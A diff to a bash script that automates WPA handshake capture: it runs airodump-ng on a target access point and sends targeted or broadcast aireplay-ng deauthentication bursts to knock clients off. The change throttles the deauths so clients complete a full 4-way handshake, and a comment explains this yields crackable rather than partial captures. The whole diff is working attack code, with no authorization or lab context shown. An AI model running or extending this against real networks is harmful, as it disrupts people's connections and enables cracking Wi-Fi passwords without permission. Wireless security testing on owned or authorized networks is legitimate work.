@@ -182,7 +182,7 @@ cap="$OUTDIR/hs"; rm -f "$cap"-*.cap "$cap"-*.csv
 airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$cap" --output-format pcap,csv "$MON" >/dev/null 2>&1 &
 AIRO_PID=$!; sleep 4
 have_hs(){ aircrack-ng "$cap"-01.cap 2>/dev/null | grep -qiE "$BSSID.*1 handshake|\(1 handshake\)"; }
-start=$(date +%s); rounds=0; quiet=0; CAPTURED=0
+start=$(date +%s); rounds=0; quiet=0; CAPTURED=0; last_deauth=0; DEAUTH_EVERY=${DEAUTH_EVERY:-15}
 while :; do
   elapsed=$(( $(date +%s) - start ))
   if have_hs; then
@@ -193,28 +193,36 @@ while :; do
     break
   fi
   [ "$elapsed" -ge "$CAP_TO" ] && { warn "timeout (${CAP_TO}s) with no handshake"; break; }
-  clients=$(awk -F, -v b="$BSSID" 'f && $1 ~ /:/ && toupper($0) ~ toupper(b){gsub(/ /,"",$1);print $1}
-            /Station MAC/{f=1}' "$cap"-01.csv 2>/dev/null | sort -u | head -5)
-  if [ -n "${clients:-}" ]; then
-    quiet=0
-    for cmac in $clients; do
-      [ "${cmac^^}" = "${BSSID^^}" ] && continue
-      rounds=$((rounds+1)); info "deauth -> client $cmac (round $rounds)"
-      aireplay-ng --deauth "$DEAUTH_N" -a "$BSSID" -c "$cmac" "$MON" >/dev/null 2>&1 || true
-    done
-  else
-    rounds=$((rounds+1)); info "no clients yet — broadcast deauth (round $rounds)"
-    aireplay-ng --deauth "$DEAUTH_N" -a "$BSSID" "$MON" >/dev/null 2>&1 || true
-    quiet=$((quiet+1))
-    if [ "$quiet" -ge 6 ]; then
-      warn "radio looks quiet — resetting (rtw88-over-USB wedge)"; kill "$AIRO_PID" 2>/dev/null
-      reset_radio; iw dev "$MON" set channel "$CHAN" 2>/dev/null
-      airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$cap" --output-format pcap,csv "$MON" >/dev/null 2>&1 &
-      AIRO_PID=$!; quiet=0; sleep 4
+  # throttle deauth: send one burst, then listen quietly for DEAUTH_EVERY seconds so the
+  # client can finish a full 4-way handshake before we knock it off again. Deauthing every
+  # few seconds just spams the client and tends to capture only partial, uncrackable
+  # handshakes — which is why many rounds can hammer a client yet capture nothing.
+  now=$(date +%s)
+  if [ "$(( now - last_deauth ))" -ge "$DEAUTH_EVERY" ]; then
+    clients=$(awk -F, -v b="$BSSID" 'f && $1 ~ /:/ && toupper($0) ~ toupper(b){gsub(/ /,"",$1);print $1}
+              /Station MAC/{f=1}' "$cap"-01.csv 2>/dev/null | sort -u | head -5)
+    if [ -n "${clients:-}" ]; then
+      quiet=0
+      for cmac in $clients; do
+        [ "${cmac^^}" = "${BSSID^^}" ] && continue
+        rounds=$((rounds+1)); info "deauth -> client $cmac (round $rounds)"
+        aireplay-ng --deauth "$DEAUTH_N" -a "$BSSID" -c "$cmac" "$MON" >/dev/null 2>&1 || true
+      done
+    else
+      rounds=$((rounds+1)); info "no clients yet — broadcast deauth (round $rounds)"
+      aireplay-ng --deauth "$DEAUTH_N" -a "$BSSID" "$MON" >/dev/null 2>&1 || true
+      quiet=$((quiet+1))
+      if [ "$quiet" -ge 4 ]; then
+        warn "radio looks quiet — resetting (rtw88-over-USB wedge)"; kill "$AIRO_PID" 2>/dev/null
+        reset_radio; iw dev "$MON" set channel "$CHAN" 2>/dev/null
+        airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$cap" --output-format pcap,csv "$MON" >/dev/null 2>&1 &
+        AIRO_PID=$!; quiet=0; sleep 4
+      fi
     fi
+    last_deauth=$now
   fi
   info "... ${elapsed}s elapsed, listening (Ctrl-C to stop)"
-  sleep 6
+  sleep 3
 done
 kill "$AIRO_PID" 2>/dev/null; AIRO_PID=""
 # decide on the in-loop result only — do NOT re-run have_hs against the live file we just killed
